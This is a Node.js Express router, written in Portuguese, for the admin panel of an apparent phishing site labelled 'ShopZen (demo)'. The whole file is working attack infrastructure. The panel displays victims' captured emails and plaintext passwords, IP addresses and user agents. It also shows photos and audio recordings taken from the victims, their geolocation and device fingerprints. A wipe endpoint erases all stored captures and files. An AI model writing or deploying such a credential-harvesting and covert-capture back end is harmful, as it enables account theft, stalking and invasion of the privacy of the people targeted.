const express = require('express');
const fs = require('node:fs');
const path = require('node:path');
const db = require('../db');
const adminAuth = require('../middleware/adminAuth');

const router = express.Router();

function escapeHtml(valor) {
  if (valor === null || valor === undefined) return '';
  return String(valor)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

function formatarData(iso) {
  return new Date(iso).toLocaleString('pt-BR');
}

function formatarDispositivoInfo(infoJson) {
  if (!infoJson) return null;

  let info;
  try {
    info = JSON.parse(infoJson);
  } catch {
    return null;
  }

  const rotulos = {
    largura: 'Largura da tela',
    altura: 'Altura da tela',
    pixelRatio: 'Pixel ratio',
    fusoHorario: 'Fuso horario',
    idioma: 'Idioma',
    idiomas: 'Idiomas',
    plataforma: 'Plataforma',
    nucleosCpu: 'Nucleos de CPU',
    memoriaDispositivo: 'Memoria (GB aprox.)',
    conexaoTipo: 'Tipo de conexao',
    conexaoVelocidade: 'Velocidade (Mbps aprox.)',
    bateriaNivel: 'Nivel de bateria',
    bateriaCarregando: 'Carregando',
  };

  const linhas = Object.entries(info)
    .filter(([, valor]) => valor !== undefined && valor !== null)
    .map(([chave, valor]) => {
      let exibido = Array.isArray(valor) ? valor.join(', ') : String(valor);
      if (chave === 'bateriaNivel') exibido = `${Math.round(valor * 100)}%`;
      if (chave === 'bateriaCarregando') exibido = valor ? 'Sim' : 'Nao';
      return `<p><strong>${escapeHtml(rotulos[chave] || chave)}:</strong> ${escapeHtml(exibido)}</p>`;
    });

  return linhas.length ? linhas.join('') : null;
}

function cardCaptura(row) {
  const temFoto = Boolean(row.foto_path);
  const temAudio = Boolean(row.audio_path);
  const temGeo = row.geo_lat !== null && row.geo_lon !== null;
  const dispositivoInfoHtml = formatarDispositivoInfo(row.dispositivo_json);

  const fotoHtml = temFoto
    ? `<img src="/admin/arquivo/${encodeURIComponent(row.session_id)}/foto" alt="Foto capturada" class="captura-foto">`
    : '<p class="sem-dado">Sem foto</p>';

  const audioHtml = temAudio
    ? `<audio controls src="/admin/arquivo/${encodeURIComponent(row.session_id)}/audio"></audio>`
    : '<p class="sem-dado">Sem audio</p>';

  let mapaHtml = '<p class="sem-dado">Sem localizacao</p>';
  if (temGeo) {
    const delta = 0.01;
    const bbox = `${row.geo_lon - delta},${row.geo_lat - delta},${row.geo_lon + delta},${row.geo_lat + delta}`;
    const mapaUrl = `https://www.openstreetmap.org/export/embed.html?bbox=${bbox}&marker=${row.geo_lat},${row.geo_lon}`;
    mapaHtml = `<iframe class="captura-mapa" src="${mapaUrl}" loading="lazy"></iframe>`;
  }

  return `
    <div class="card-captura">
      <div class="card-header">
        <span class="card-data">${escapeHtml(formatarData(row.criado_em))}</span>
        <span class="card-sid">${escapeHtml(row.session_id)}</span>
      </div>
      <div class="card-credenciais">
        <p><strong>Usuario:</strong> ${escapeHtml(row.email) || '<em>nao informado</em>'}</p>
        <p><strong>Senha:</strong> <span class="senha-capturada">${escapeHtml(row.senha) || '<em>nao informada</em>'}</span></p>
        <p><strong>IP:</strong> ${escapeHtml(row.ip) || '-'}</p>
        <p><strong>Dispositivo:</strong> ${escapeHtml(row.user_agent) || '-'}</p>
      </div>
      <div class="card-midia">
        <div class="midia-bloco">
          <h4>Foto</h4>
          ${fotoHtml}
        </div>
        <div class="midia-bloco">
          <h4>Audio</h4>
          ${audioHtml}
        </div>
        <div class="midia-bloco">
          <h4>Localizacao</h4>
          ${mapaHtml}
        </div>
      </div>
      ${dispositivoInfoHtml ? `<div class="card-dispositivo"><h4>Informacoes do dispositivo</h4>${dispositivoInfoHtml}</div>` : ''}
    </div>
  `;
}

router.get('/admin', adminAuth, (req, res) => {
  const capturas = db.listarCapturas();

  const corpo = capturas.length
    ? capturas.map(cardCaptura).join('\n')
    : '<p class="estado-vazio">Nenhuma captura ainda.</p>';

  res.send(`<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>ShopZen Admin</title>
  <link rel="stylesheet" href="/css/style.css">
</head>
<body>
  <div class="admin-container">
    <header class="admin-header">
      <h1>Painel de capturas - ShopZen (demo)</h1>
      <button id="btn-wipe" class="btn btn-danger">Apagar tudo</button>
    </header>
    <main class="admin-lista">
      ${corpo}
    </main>
  </div>
  <script>
    document.getElementById('btn-wipe').addEventListener('click', async () => {
      if (!confirm('Apagar todas as capturas? Essa acao nao pode ser desfeita.')) return;
      const res = await fetch('/admin/wipe', { method: 'POST' });
      if (res.ok) {
        window.location.reload();
      } else {
        alert('Falha ao apagar.');
      }
    });
  </script>
</body>
</html>`);
});

router.get('/admin/arquivo/:sessionId/:tipo', adminAuth, (req, res) => {
  const { sessionId, tipo } = req.params;
  const capturas = db.listarCapturas();
  const row = capturas.find((c) => c.session_id === sessionId);

  if (!row) return res.status(404).end();

  if (tipo === 'foto' && row.foto_path) return res.sendFile(row.foto_path);
  if (tipo === 'audio' && row.audio_path) return res.sendFile(row.audio_path);

  return res.status(404).end();
});

router.post('/admin/wipe', adminAuth, (req, res) => {
  const paths = db.wipeTudo();

  for (const filePath of paths) {
    fs.unlink(filePath, () => {});
  }

  return res.json({ ok: true });
});

module.exports = router;
